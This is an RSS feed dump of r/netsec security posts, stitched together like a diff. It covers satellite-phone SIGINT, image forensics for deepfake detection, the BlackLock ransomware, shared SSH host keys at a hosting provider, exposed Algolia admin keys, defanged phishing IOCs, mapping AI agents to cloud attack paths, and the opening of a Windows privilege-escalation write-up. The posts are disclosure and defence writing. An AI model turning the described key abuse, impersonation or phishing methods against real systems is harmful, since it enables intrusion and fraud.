law enforcement). The opacity of proprietary technology really isn’t much of a barrier either, given Western intelligence’s long-standing targeting of Huawei. In fact, some public security research has already been performed on the HarmonyOS NEXT ecosystem and Balong baseband [1, 2, 3].While the Tiantong ecosystem doesn’t look like brand new magical fairy dust technology, it might make sense for certain parties worried about Western or under-resourced intelligence agencies surveilling regular cellular networks. It essentially forces such agencies to deploy expensive SIGINT capabilities around the right spot beams and while the U.S. can operate unimpeded at SCS sites in virtually all countries surrounding Iran, this isn’t the case for every SIGINT agency everywhere and likely still requires some more perilous rollout of covert infrastructure inside Iran itself. On top of that if no GPS information can be extracted from Tiantong traffic, geolocation becomes far less granular. Depending on caveats mentioned above, cracking its cryptography might prove a tough challenge as well and remote exploitation and supply chain attacks are also likely to be more laborious (for now). Still, good opsec would need to be observed by disabling cellular capabilities and avoiding co-traveling devices. As such, while hardly revolutionary or foolproof - one can see how adopting Tiantong might make sense for certain actors.For those interested in advancing their RF security skills, Midnight Blue will be delivering its Red Team SIGINT training at .This practically-oriented course, aimed at red team operators and pentesters, will teach attendees the fundamentals of RF, SDR, and SIGINT before quickly moving on to effective guidance on identifying and decoding unknown signals as well as exploiting common pitfalls in RF security.‍Where other SDR trainings tend to focus on enterprise and IoT RF protocols such as 4G/5G, WiFi, RFID, and BT, this training focuses on important but rarely addressed RF technologies such as automotive, aviation, marine, and physical access control RF protocols and mission-critical radio (e.g. TETRA, DMR, P25) used by police, military, private security, and critical infrastructure.Hands-on exercises such as intercepting and decrypting handheld radio comms and breaking automotive security systems are alternated with thorough overviews of relevant RF protocols and their security posture as well as case studies of real-world RF attacks on railways, water utilities, drones, and police/military radios.An overview of the course can be found ‍]]></content:encoded></item><item><title>Tea continued - Unauthenticated access to 150+ Firebase databases, storage buckets and secrets</title><link>https://ice0.blog/docs/openfirebase</link><author>/u/Woowowow91</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 18:44:24 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Image Forensics: Detecting AI Fakes with Compression Artifacts</title><link>https://dmanco.dev/2025/09/15/basics-of-image-forensics-1.html</link><author>/u/Doch88</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 16:47:03 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Let’s start with some context. Why am I writing this post?I work at Fourthline, a company that manages the Know Your Customer (KYC) process for companies like Revolut, TradeRepublic, and N26. 
-For those who don’t know what KYC is, think of when you register online to use one of these services and are asked to take a selfie and a picture of your ID document to prove you are who you claim to be. 
-That’s KYC in a nutshell, and as you may guess, we don’t want fraudsters to slip through. If you’ve ever played Papers, Please, you can imagine this isn’t always easy. Fraudsters are getting better, and technology is helping them. 
-Deepfakes and AI-generated selfies and documents have become some of their tools, and my job at Fourthline is also to fight this kind of AI. 
-Yes, I’m an AI engineer who fights AI. A sort of cyberwar destined to become even more challenging as technology advances. But to fight deepfakes, I should also study how similar problems were handled in the past. 
-Image manipulation has existed for decades, long before generative models reached today’s quality. 
-So let’s go back to 2007 and talk about compression and Error Level Analysis (ELA).Almost every image on the internet is compressed; handling uncompressed images everywhere would be too expensive. 
-Let’s look at an example. I took an image with my camera with a resolution of 6000x4000. 
-Quick math: that’s 24,000,000 pixels. Every pixel stores information about color, and color in computer science is usually expressed with 8 bits. 
-To cover most colors, we need three channels — red, green, and blue — so every pixel carries 8 × 3 bits of information. The weight of this image should be 6000 × 4000 × 8 × 3 = 576,000,000 bits, or 72 megabytes. 
-Instead, it weighs only 6 megabytes. JPEG is the most widely used image compression algorithm. In simple terms, the algorithm works by removing parts of the image that are barely noticeable to the human eye. It has a parameter called  that sets how aggressive the compression is.
-A quality of 100% means very little is removed, while 1% means heavy information loss. Because information is lost, the image content is altered in subtle ways. If you look at the single pixel values, you’ll notice differences. Depending on the chosen quality, these differences may be invisible to the eye but still exist. 
-These differences are a trace left by the JPEG compression, a sort of fingerprint. We call them . Now the interesting part comes.  
-Since JPEG compression is applied to the entire image, these artifacts should always be  inside the image. 
-If the image is tampered with in some way - say an object is removed in Photoshop - this will affect the JPEG artifacts as well.
-You would notice an inconsistency of these artifacts in the particular area of the image that was altered. 
-And this is exactly what ELA is based on.Take the image to analyzeCompress it again with JPEG at a chosen quality - this will become a parameter of ELACalculate the difference between the two imagesThe result is an ELA map to interpret.  
-The assumption here is that the image (or parts of it) was compressed with JPEG at some point. Let’s use a toy example to explain how it works. Using something from my domain of work, let’s consider this specimen of a French national ID card. Suppose I know it was compressed at JPEG quality 95%. I’ll use that later. 
-Now, I inpaint the image with an AI model and get this:And, importantly, I save this deepfake in PNG format. 
-Unlike JPEG, PNG uses  compression, meaning no information is lost. Now, using the information above, we perform ELA with a .
-In this way, the part of the image that was already compressed with the same quality factor should not produce any new artifact.The tampered area is obvious. We successfully detected the deepfake ID and blocked a fraudster. But in reality, you may not know the original JPEG quality, and it’s unlikely that the manipulated image (previously a JPEG) would be saved as PNG.Now let’s assume the deepfake was saved as JPEG. 
-We don’t know the quality factor. We only know that if the image was altered, part of it will be double-compressed and part single-compressed, producing inconsistency.We perform ELA with JPEG quality 80% for both images.Now ELA feels more like art. 
-There’s a clear difference, but without knowing tampering occurred, could you detect it from the map alone? 
-To better understand how to interpret an ELA map, we can take some notes from how JPEG works: JPEG creates more artifacts in high-contrast areas (like text or borders), making ELA brighter there.Flat surfaces should have uniform ELA values.Similar textures should produce similar ELA.If some part of the image doesn’t respect these ‘rules’, then it might be suspicious. Like the deepfaked face on the ID, with a suspiciously bright ELA. 
-For more tips, see FotoForensics and their tutorials.So, can ELA be a solution to detect AI-manipulated images? 
-No, not by itself anyway. ELA is just a tool in the Image Forensics toolbox that can help fight deepfakes. 
-But many other things can be used together with ELA, such as EXIF information, PRNU, PCA and so on. 
-And probably some of these techniques will be the topic for another post.]]></content:encoded></item><item><title>BlackLock Ransomware: From Meteoric Rise to Sudden Disruption</title><link>https://wealthari.com/blacklock-ransomware-from-meteoric-rise-to-sudden-disruption/</link><author>/u/Koyaanisquatsi_</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 07:35:57 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ has quickly climbed the ranks in the global ransomware scene, setting new benchmarks for attack frequency and technical complexity. Emerging in March 2024 under the name El Dorado, the group rapidly rebranded and, by late 2024, was responsible for a 1,425% surge in data leak site posts, making it the fifth most active ransomware group worldwide by January 2025.Advanced Attack Techniques & Double ExtortionBlackLock distinguishes itself by deploying custom-built malware—eschewing leaked builder kits common among competitors—and leveraging a cross-platform approach that targets Windows, Linux, and VMware ESXi environments. The ransomware utilizes the powerful ChaCha20 stream cipher and advanced ECDH key exchange mechanisms to encrypt files and metadata, rendering standard recovery methods useless.BlackLock’s double extortion tactic combines file encryption with the exfiltration of sensitive data: victims are threatened with both permanent data loss and public exposure unless they pay the ransom. Encrypted files are renamed with randomized strings and extensions, and ransom notes are left titled “HOW_RETURN_YOUR_DATA.TXT” in compromised folders.Operations Disrupted by Major Security BreachIn March 2025, BlackLock faced an unprecedented disruption. Cybersecurity researchers from Resecurity exploited a vulnerability in the group’s data leak site, exposing its infrastructure, clearnet IPs, and MEGA storage accounts for stolen data. The situation escalated when the rival DragonForce group defaced BlackLock’s site and leaked configuration details—forcing BlackLock and its affiliates offline for the foreseeable future.Ongoing Threats and Industry ImpactDespite the recent dismantling, BlackLock’s legacy remains concerning. Its aggressive recruitment strategies, particularly on the Russian-language forum RAMP, and its unique technical sophistication have made it a blueprint for future ransomware operations. With attacks striking public services, technology firms, manufacturing, and government agencies across several countries, analysts warn that the threat model established by BlackLock will influence ransomware trends throughout 2025.Security experts recommend organizations invest in robust backup solutions, network segmentation, comprehensive endpoint protection, and regular patch management to mitigate risks from similar cross-platform ransomware threats. Proactive monitoring and intelligence sharing remain critical in defending against evolving attack methodologies pioneered by groups like BlackLock.]]></content:encoded></item><item><title>Journeys in Hosting 1/x - Precomputed SSH Host Keys</title><link>https://dataplane.org/jtk/blog/2025/09/hosting-stories-1/</link><author>/u/jtkchicago</author><category>netsec</category><pubDate>Mon, 22 Sep 2025 22:05:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In what I hope will be the debut of many in a series to come, I want to
-share my experience and musings as a frequent traveler in the world of
-hosting providers.  Sometimes it will be just curious anomalies, of
-little interest to but a few.  But perhaps some tales told here will
-ultimately prove valuable to others looking for insight even if to
-obscure scenarios.  Maybe especially to obscure scenarios.This inaugural article will focus on the unusual and curious operational
-behavior of precomputed SSH host keys in default system installs by
-LightNode.LightNode is the server hosting brand of Kaopu Cloud, a global network
-services provider based in China.  They have been providing KVM-based
-hosting for approximately four years as of this writing. A compelling
-feature of LightNode’s offerings is the rather unique set of data center
-markets they operate in.  Otherwise, most of the capabilities the
-LightNode platform has are similar to many global hosting providers.
-The one notable exception is they do not currently offer native IPv6
-addressing and connectivity.“[ASN-DROP entries are] associated with the worst of the worst
-behavior. These are ASNs that our researchers wouldn’t recommend
-engaging with and are highly likely to announce or supply transit to
-IP ranges associated with malicious behavior. From networks hosting
-botnet command and control systems, to “bulletproof” networks selling
-connectivity/hosting to cyber criminals, to hardcore spammers, and
-more.”Despite appearing in ASN-DROP, LightNode is relatively popular and
-seemingly widely used by many.  At the time of this writing the
-originating AS announces the equivalent of about three /16 IPv4 prefixes
-or roughly 180 thousand addresses.  Far fewer than the biggest cloud
-providers, and about an order of magnitude less than Linode (AS 63949)
-has for example, but still more than what most .edu’s hold.To setup a new system through LightNode’s user interface you choose a
-location, system type, system version if applicable, and minimum
-resource requirements to name a few configurable options.A system type may be a vanilla operating system image such as Ubuntu,
-Debian, AlmaLinux, Arch Linux, CentOS, FreeBSD, Rocky Linux, or Windows.
-For most OS types there are usually a few different versions to choose
-from.  There are over a dozen application-specific system types if you
-want a preconfigured Docker or WordPress system for example.  This
-process is straightforward and would seem familiar to anyone who has had
-experience using other hosting providers.  There is nothing particularly
-special about this process.  However, there is one very specific,
-default configuration detail on most if not all the LightNode installed
-systems I’ve not seen replicated by any other hosting provider.Each of LightNode’s Unix-based system options will install an OpenSSH
-server listening on TCP port 22 by default.  You have the option of
-specifying access to the SSH service with a public key or password.
-Normally, the SSH server host keys are generated as part of the package
-installation process using the  utility.  This would result
-in one-time unique pairs of keys for each and every system.  This is
-where LightNode seems to do something very different than every other
-hosting provider I’m aware of.I tested a number of configurations and performed a survey of LightNode SSH
-servers listening on TCP port 22 to support this claim.  The table below shows
-the number of TCP port 22 SSH listeners, distinct host keys, and distinct key
-types I found:We would not expect to see so few keys compared to the number of TCP port 22
-listeners.  Most modern Unix-based systems would have two or three different
-and unique keys per system, so in theory we’d expect see roughly 60,000 to
-90,000 keys.  Instead, on average we see at least 25 addresses for every key.
-In fact it is a worse than that, because 1228 represents all key types and most
-hosts use three key types on average.  If we consider only  keys,
-the most common type, this is what emerges:The number of listeners that have an ssh-rsa host key is 98.5% of the
-original count, but the number of unique keys is now 39% of the
-original.  This is is significant amount of SSH host key duplication
-across LightNode’s infrastructure.This leads us to ask at least one more question.  If there are 478
-distinct ssh-rsa host keys, how many times are each of those keys used?
-Surely LightNode doesn’t have 478 different system types does it?  No,
-it is something less than that.  We might not know exactly what the
-unique count is given that some templates may been retired, but we can
-examine keys by popularity.  A table of statistics starts to get a
-little messy so I’ll simply tell you that the most popular ssh-rsa key
-is associated with LightNode’s Ubuntu 22.04 template.  It is seen on
-over 10,000 Listener addresses!  About one in three LightNode systems
-with a public SSH listener on TCP port run Ubuntu 22.04 and all use the
-same SSH host key.So LightNode appears to have precomputed SSH host keys for each of the
-unique system templates it offers as an install option.  For example,
-all LightNode Debian 12 installations, by default, will use the same SSH
-host key pairs that you’ll find stored in 
-files.  Debian 11 will use another set of keys, but common to all Debian
-11 installations.  And so on.  It is unclear if this is a failure of
-entropy or if ssh-keygen is just never run, but the outcome is the same.
-The host keys are predictable and shared with other hosts built from the
-same system template configuration.I can think of two scenarios where this anomaly might purposely occur in
-practice.  One, some hosts have multiple addresses assigned, and each
-address has the same SSH server daemon active and willing to accept
-connections across all interfaces.  In this case you’d see what looks
-like a multi-homed system.  Honeypots may exhibit this behavior for
-example.  Two, each listener address may be a different system, but host
-keys are being generated from the exact same entropy source for
-ssh-keygen, or are set to use precomputed ssh host keys.  You might find
-this in certain enterprise or private environments as a way to simplify
-key management.  It is this second scenario that LightNode appears to
-fall into.It is unclear why LightNode sets up the SSH listener this way for
-public, independent systems.  Perhaps the platform designer thought this
-would speed-up system setup and VM creation time?  Should we care about
-this?  Is it really bad?  Could this be something more insidious?  What,
-if anything, do we do?Exposure of private encryption keys is a bad thing, and potentially
-catastrophic.  However, when it comes to SSH server host keys, the
-damage is not as great as it might be compared to other public key
-systems.  SSH server host keys are used to “identify” the system.  An
-impersonation attack is feasible here.  That is, if someone hijacked the
-SSH server IP address and used the same SSH host keys, an unwitting
-client would not receive an authentication warning, because from the
-perspective of the SSH protocol, it looks like the same system.  A
-hijack, or MitM attack, of this sort might then be able to capture and
-decrypt communications from there on out.  However, even if past traffic
-was captured and the SSH server host keys are known, a separate session
-key is used for traffic encryption that cannot be easily derived without
-direct access to an end system at the time of operation.  In the
-immortal words of the The Hitchhiker’s Guide to the Galaxy: Don’t Panic.Nevertheless, this scenario is less than ideal.  I tried to contact
-LightNode support about this.  I also tried to reach out to
-CNCERT/CC, the national computer network
-emergency response technical team / coordination center of China.  A
-colleague also tried to communicate with a CNCERT contact on my
-behalf.  These attempts have been met with silence.  I’d guess this may
-help explain why the ASN is listed on the Spamhaus ASN-DROP.  Perhaps,
-as another colleague once put it, the difference in our native languages
-can act as a natural firewall between us.Technically LightNode or someone with the ability to hijack LightNode
-addresses could impersonate SSH servers there. I’m inclined to accept
-this is a relatively low probability threat, and likely an unintentional
-vulnerability on LightNode’s part.  If you’re a LightNode customer, it
-would be wise to setup new host keys.  If you or anyone you know has any
-ability to convince LightNode to alter this practice, I’d be happy to
-hear about it.]]></content:encoded></item></channel></rss>
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Looking for an arXiv cs.CR endorser</title><link>https://arxiv.org/auth/endorse?x=W6R4B4</link><author>/u/An1m3sh</author><category>netsec</category><pubDate>Sat, 14 Mar 2026 08:36:54 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>I Found 39 Algolia Admin Keys Exposed Across Open Source Documentation Sites</title><link>https://benzimmermann.dev/blog/algolia-docsearch-admin-keys</link><author>/u/Grand_Fan_9804</author><category>netsec</category><pubDate>Fri, 13 Mar 2026 22:54:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Last October I reported an exposed Algolia admin API key on vuejs.org. The key had full permissions: addObject, deleteObject, deleteIndex, editSettings, the works. Vue acknowledged it, added me to their Security Hall of Fame, and rotated the key.That should have been the end of it. But it got me thinking: if Vue.js had this problem, how many other DocSearch sites do too?How Algolia DocSearch worksAlgolia's DocSearch is a free search service for open source docs. They crawl your site, index it, and give you an API key to embed in your frontend. That key is supposed to be search-only, but some ship with full admin permissions.Most keys came from frontend scraping. Algolia maintains a public (now archived) repo called docsearch-configs with a config for every site in the DocSearch program, over 3,500 of them. I used that as a starting target list and scraped roughly 15,000 documentation sites for embedded credentials. This catches keys that don't exist in any repo because they're injected at build time and only appear in the deployed site:On top of that I ran GitHub code search to find keys in doc framework configs, then cloned and ran TruffleHog on 500+ documentation site repos to catch keys that had been committed and later removed.35 of the 39 admin keys came from frontend scraping alone. The remaining 4 were found through git history. Every single one was active at the time of discovery.The affected projects include some massive open source projects:Home Assistant alone has 85,000 GitHub stars and millions of active installations. KEDA is a CNCF project used in production Kubernetes clusters. vcluster, also Kubernetes infrastructure, had the largest search index of any affected site at over 100,000 records.Nearly all 39 keys share the same permission set: search, addObject, deleteObject, deleteIndex, editSettings, listIndexes, and browse. A few have even broader access including analytics, logs, and NLU capabilities.In practical terms, anyone with one of these keys can:Add, modify, or delete any record in the search indexChange index settings and ranking configurationBrowse and export all indexed contentSomeone could poison a project's search results with malicious links, redirect users to phishing pages, or just nuke the entire index and wipe out search for the site completely.SUSE/Rancher acknowledged the report within two days and rotated the key. That key is now fully revoked. Home Assistant also responded and began remediation, though the original key remains active.I compiled the full list of affected keys and emailed Algolia directly a few weeks ago. No response. As of today, all remaining keys are still active.This isn't really about 39 individual misconfigurations. Algolia's DocSearch program provides search-only keys, but many sites run their own crawler and end up using their write or admin key in the frontend config instead. Algolia's own docs warn against this, but it clearly happens at scale.The fix is straightforward: if you're running DocSearch, check what key is in your frontend config and make sure it's search-only. If I found 39 admin keys with a few scripts, the real number is almost certainly higher.]]></content:encoded></item><item><title>Phishing campaign abusing Google Cloud Storage redirectors to multiple scam pages</title><link>https://malwr-analysis.com/2026/03/14/ongoing-phishing-campaign-abusing-google-cloud-storage-to-redirect-users-to-multiple-scam-pages/</link><author>/u/anuraggawande</author><category>netsec</category><pubDate>Fri, 13 Mar 2026 21:55:10 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[A few days ago, I published a blog analyzing a phishing campaign abusing Google Cloud infrastructure:While continuing to monitor the infrastructure used in that campaign, I discovered several additional URLs hosted on Google Cloud Storage (storage[.]googleapis[.]com) that appear to be part of the same ecosystem. These pages act as intermediate redirectors, sending victims to a wide variety of phishing and scam sites hosted primarily on the .autos TLD.What is interesting is that a single Google Cloud Storage page appears to function as a central redirect hub, distributing victims across multiple scam themes such as fake surveys, reward scams, antivirus alerts, job offers, and account storage warnings.Newly Observed Google Cloud Storage URLsThe following URLs were identified during the investigation:storage[.]googleapis[.]com/whilewait/successcomes.htmlstorage[.]googleapis[.]com/sndrr/strow.htmlstorage[.]googleapis[.]com/noonchi/noon.htmlstorage[.]googleapis[.]com/sndrr/hmd.htmlstorage[.]googleapis[.]com/wetaobao/taobao.htmlstorage[.]googleapis[.]com/savelinge/goforward.htmlstorage[.]googleapis[.]com/lithesome/stepupnow.htmlOne particular page stood out during analysis:This page appears to function as a traffic distribution page, redirecting visitors to multiple phishing sites depending on campaign configuration.storage[.]googleapis[.]com/whilewait/successcomes.htmlI also shared an earlier observation on X (Twitter):Traffic Redirection to .autos Phishing DomainsThe redirector page was observed sending users to various phishing domains, most of which are hosted under the  top-level domain.These phishing sites are themed around different scams designed to lure victims into providing personal or financial information.Below are the different campaign themes identified.Netflix Reward Phishing PagesSome pages impersonate Netflix reward programs, claiming users have won prizes or special promotions.digital-shift-us-bin[.]autossearchonboardloadingrock[.]autosmailanalyticsvolseries[.]autosverifieddreamseriesultimate[.]autosalt-dig-gold-tab[.]autosbio-easy-pe-loading[.]autosanalytics-mail-post-quite[.]autosfavouritebiochoicelife[.]autosAdditional domains were also shared by an X user @skocherhan quoting my earlier post:Additional domains observed:goldavgpenb[.]autosalt-dig-gold-tab[.]autosbio-easy-pe-loading[.]autosanalytics-mail-post-quite[.]autosfavouritebiochoicelife[.]autosThese pages typically present users with messages claiming they have been selected for a Netflix reward or promotional giveaway, encouraging them to complete a short survey to claim their prize.Like the other scams in this campaign, the pages ultimately attempt to collect personal or payment information, often under the pretext of paying a small shipping fee or verifying eligibility.Fake Dell Laptop Giveaway SurveyAnother variation promotes a Dell laptop giveaway, typically claiming that users can win a Dell 16 DC16250 laptop worth $699.99.Domains hosting these pages include:avgeasyposttips[.]autossearchonboardloadingrock[.]autosgold-avg-pe-nb[.]autostra4fficjumpchoiceclever[.]autosdigprtdreamavg[.]autosshifttra4fficcapsmatch[.]autosdigitalshiftusbin[.]autosrot-digital-fly-f2f[.]autosAsk the victim to answer a few survey questions.Display a congratulatory message.Request credit card details to pay for shipping fees.Fake “AI Data Assistant – Earn $500/day” Job LureAnother theme used in this campaign promotes a fake online job opportunity, claiming users can earn $500 per day as an AI data assistant.verifieddreamseriesultimate[.]autospushbuttonsystem[.]netlifeverifiedfavouritever[.]autosmailanalyticsvolseries[.]autosThese pages typically claim:Work from home opportunitiesUsers are often redirected through several steps designed to collect personal information or push affiliate offers.“Antivirus Subscription Expired” Phishing PagesAnother set of pages impersonates security alerts, claiming the user’s antivirus subscription has expired.safepremiumfreeriskfree[.]autosnationalrecommendsafesmart[.]autosdeviceriskfreesafe[.]autosfreespeedpopular[.]autosguardpopularinstalldevice[.]autosspeeddeviceboostfast[.]autosprogrameffectivespeedfast[.]autosDisplay fake security warningsUrge users to renew antivirus protectionRedirect victims to payment or affiliate pages.“Cloud Storage Full” Phishing PagesAnother variation of this campaign uses cloud storage warnings, claiming the user’s storage account is full.stairs-table-fire.autostablewordstairs[.]autosceilwordinteriorbowl[.]autossafe-premium-free-riskfree[.]autosnationalprotectsmartfree[.]autosguardpopularinstalldevice[.]autosceil-word-interior-bowl[.]autosfree-speed-popular-guard[.]autosdevice-safe-clean-boost[.]autosboost-premium-recommend-effective[.]autostrk[.]independent-teacher-strength-nails[.]runAdditional domains were also shared by an X user quoting my earlier post:These pages often mimic services such as:The goal is to scare victims into clicking through fake upgrade or security alerts.Several phishing domains impersonate Walmart survey reward campaigns, often promising a free gift or prize in exchange for completing a short survey.jumpdiganalyticsprt[.]autosavgeasyposttips[.]autoscleververifieddigitalmatch[.]autosaltbio[.]autosmatchstarsrotchoice[.]autosdigprtdreamavg[.]autosThese pages typically display messages such as:“Congratulations! You have been selected to receive a reward”“Complete a short Walmart survey to claim your prize”After the survey is completed, victims are usually asked to pay a small shipping fee, where credit card information is harvested.One of the most notable aspects of this campaign is the central role of the Google Cloud Storage page:storage[.]googleapis[.]com/whilewait/successcomes.htmlDuring testing, this page was observed redirecting users to multiple phishing domains across different scam themes.This suggests it is functioning as a traffic distribution or redirect infrastructure, allowing attackers to rotate phishing destinations while keeping the initial delivery URL stable.Using  also adds a layer of trust, as the domain belongs to a legitimate cloud provider.Another interesting observation is that a single .autos domain can serve multiple phishing page themes after redirection from the Google Cloud Storage page. Depending on the redirection path or parameters, the same domain may host different scams such as:Antivirus subscription warningsThis behavior indicates that the attackers are likely using a shared phishing kit or centralized backend infrastructure, allowing them to quickly rotate scam themes while reusing the same domains.Another observation is the high volume of phishing emails currently being distributed using this infrastructure. Over the past few days, I have been receiving around 40–50 phishing emails within a 24-hour period, many of which contain links to Google Cloud Storage pages that act as redirectors to the phishing ecosystem described in this report.URLs repeatedly observed in these emails include:storage[.]googleapis[.]com/whilewait/successcomes.htmlstorage[.]googleapis[.]com/savelinge/goforward.htmlIndicators of Compromise (IOCs)storage[.]googleapis[.]com/whilewait/successcomes.htmlstorage[.]googleapis[.]com/sndrr/strow.htmlstorage[.]googleapis[.]com/noonchi/noon.htmlstorage[.]googleapis[.]com/sndrr/hmd.htmlstorage[.]googleapis[.]com/wetaobao/taobao.htmlstorage[.]googleapis[.]com/savelinge/goforward.htmlstorage[.]googleapis[.]com/lithesome/stepupnow.htmldigital-shift-us-bin[.]autossearchonboardloadingrock[.]autosmailanalyticsvolseries[.]autosverifieddreamseriesultimate[.]autosalt-dig-gold-tab[.]autosbio-easy-pe-loading[.]autosanalytics-mail-post-quite[.]autosfavouritebiochoicelife[.]autosgoldavgpenb[.]autosbio-easy-pe-loading[.]autosanalytics-mail-post-quite[.]autosfavouritebiochoicelife[.]autossearchonboardloadingrock[.]autosgold-avg-pe-nb[.]autostra4fficjumpchoiceclever[.]autosdigprtdreamavg[.]autosshifttra4fficcapsmatch[.]autosdigitalshiftusbin[.]autosrot-digital-fly-f2f[.]autosverifieddreamseriesultimate[.]autospushbuttonsystem[.]netlifeverifiedfavouritever[.]autosmailanalyticsvolseries[.]autossafepremiumfreeriskfree[.]autosnationalrecommendsafesmart[.]autosdeviceriskfreesafe[.]autosguardpopularinstalldevice[.]autosspeeddeviceboostfast[.]autosprogrameffectivespeedfast[.]autostablewordstairs[.]autosceilwordinteriorbowl[.]autossafe-premium-free-riskfree[.]autosnationalprotectsmartfree[.]autosguardpopularinstalldevice[.]autosceil-word-interior-bowl[.]autosfree-speed-popular-guard[.]autosdevice-safe-clean-boost[.]autosboost-premium-recommend-effective[.]autostrk[.]independent-teacher-strength-nails[.]runjumpdiganalyticsprt[.]autoscleververifieddigitalmatch[.]autosalt-dig-gold-tab[.]autosmatchstarsrotchoice[.]autosdirectvolcapsus[.]autosThis campaign demonstrates how attackers continue to abuse trusted cloud infrastructure such as Google Cloud Storage to host redirectors that distribute victims to multiple phishing pages.By using legitimate cloud services as part of the attack chain, threat actors can increase credibility and reduce the likelihood of immediate blocking.The use of large numbers of disposable  domains further allows attackers to rotate phishing pages frequently while keeping the delivery infrastructure intact.In addition, the system appears to restrict repeated access attempts from the same IP address. After a user successfully reaches a phishing page through the redirector, subsequent attempts to access similar URLs from the same IP may result in the page failing to load or redirecting to unrelated sites. This behavior suggests the presence of IP-based filtering or traffic distribution logic, commonly used in malicious traffic distribution systems (TDS) to control how often a visitor can access the phishing infrastructure.]]></content:encoded></item><item><title>OSS Cartography can now map AI agents to cloud attack paths</title><link>https://cartography.dev/blog/aibom</link><author>/u/alexchantavy</author><category>netsec</category><pubDate>Fri, 13 Mar 2026 18:51:06 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Everyone is excited about AI agents because of what they can do on their own, but if you look at what an agent actually is at the infrastructure level, it looks a lot like a microservice:It reads and writes to storageIt's connected to the networkIt executes tools using permissions tied to an identityAs an industry we've mostly solved microservice visibility with cloud APIs, service meshes, distributed tracing, and SBOMs. However, things are still incredibly early with AI.Most teams aren't tracking which of their services run AI agents, what tools those agents have declared, what IAM roles they assume, or whether they're exposed to the internet; The capabilities to do this broadly just aren't there yet. This means that when there is an incident, there's no fast way to enumerate the agents that are affected or what they can reach.We're thrilled to share that open source . We scan container images for AI components - agents, models, tools, memory, prompts - and map them directly into the infrastructure graph alongside everything else Cartography already tracks.Because this is built in open source, teams can inspect the schema, run the queries themselves, and extend the data model as the agent ecosystem evolves.If you skip through the rest of this post, just read this. This single query answers the question: which AI agents are reachable from the internet, at what DNS name, using what IAM role, using which LLM and tools?This traverses from the  detected inside a , through the  running it, to the  it assumes and the  and  that expose it to the internet.We use scanners to find the agent, AWS APIs to find the surrounding infrastructure, and Cartography to connect them in the same graph.The agent discovery ecosystem today feels a lot like container security in the 2010s. The EU AI Act and NIST AI RMF are pushing organizations toward maintaining inventories of the AI systems they operate. You can't govern what you can't see, and you can't assess the blast radius of an agent you don't know exists.Agents in production are different from traditional apps because they are designed to be helpful and adaptive, so they may make use of whatever resources, permissions, and tools available to them. On the other hand, a traditional application is constrained by the logic its devs explicitly coded into it. For it to go off the rails, it would have to be compromised by an attacker; I talked about this in this video.We're paying a lot of attention to this space because so little of the security and governance infrastructure exists yet. The goal is straightforward: help organizations adopt AI with more confidence because they can understand and control what they're running. We're using old graph techniques to get a handle on modern problems :).The first step is figuring out what's inside the container.We use Cisco's AIBOM scanner to analyze container images and detect agents by framework (, , , and others), down to the file path and line number - special thanks to the maintainers! It picks up declared tools, models, memory, embeddings, and prompts. Each component becomes an  node in the Cartography graph, with agents getting an additional  label, connected to  nodes via manifest digest.The second step is figuring out where the image is running, and this is just stock Cartography:ECR images link to ECS containersECS containers link to ECS tasksECS tasks link to network interfaces, subnets, VPCs, security groups, load balancers, and DNS recordsThe third step is figuring out what the agent can actually do from an infra perspective. This is also stock Cartography:ECS tasks link to task definitionsTask definitions link to IAM roles and their attached policiesOn the AI side, agents link to their declared tools, models, and multi-agent workflows. The combination of IAM permissions and declared tool integrations is the agent's real capability set.The key join is  between AIBOM scan results and ECR images. This forms a bridge between "what's in the image" and "where it runs in your cloud".Notably, this doesn't require adopting any specialized infrastructure like AI gateways or similar. This approach works against container images you've already built and cloud infra you've already deployed.Which agents are reachable from the internet, and have access to read from a storage bucket?Show me all agents reachable at *.mycompany.com:Things are early and we are excitedWe're quickly adding support to discover agents and correlate them to more pieces of infrastructure beyond AWS ECS. Now that the data is in the graph, we can also build Cartography security rules that alert when an agent violates governance policies, such as an agent with no tool restrictions or one using an unapproved model provider.Try it out on your environment - Cartography is here, and PRs are always welcome. Join the Slack community. This space is still early, and we think open source is the right place to build this. We’d love feedback, contributions, and help shaping where it goes next!]]></content:encoded></item><item><title>RegPwn - Windows LPE vulnerability (now fixed)</title><link>https://www.mdsec.co.uk/2026/03/rip-regpwn/</link><author>/u/gid0rah</author><category>netsec</category><pubDate>Fri, 13 Mar 2026 17:12:22 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[As part of MDSec’s R&D work, we often discover vulnerabilities and develop exploits to support our red team engagements. When researching widely used software, it is often only a matter of time before the same vulnerability is discovered by other researchers and reported to the vendor. Two weeks ago we outlined an Elevation of Privilege vulnerability in Windows 11 that we had been leveraging in red teams but decided to report to the vendor ourselves.Ironically, today we’re documenting another Elevation Of Privilege vulnerability that was so elegant in its indicators, we kept it internal and used with great success across red team engagements since January 2025. For what will become obvious reasons, we named this vulnerability RegPwn and it affected Windows 10 and 11, as well as Windows Server 2012, 2016, 2019, 2022, and 2025. This vulnerability was fixed this Patch Tuesday and we believe is tracked as CVE-2026-24291.The Windows Accessibility features are a collection of built-in capabilities in Microsoft Windows designed to make the operating system usable for people with disabilities or specific usability needs. These features provide alternative ways to interact with the system through keyboard input, voice, screen narration, visual adjustments, and 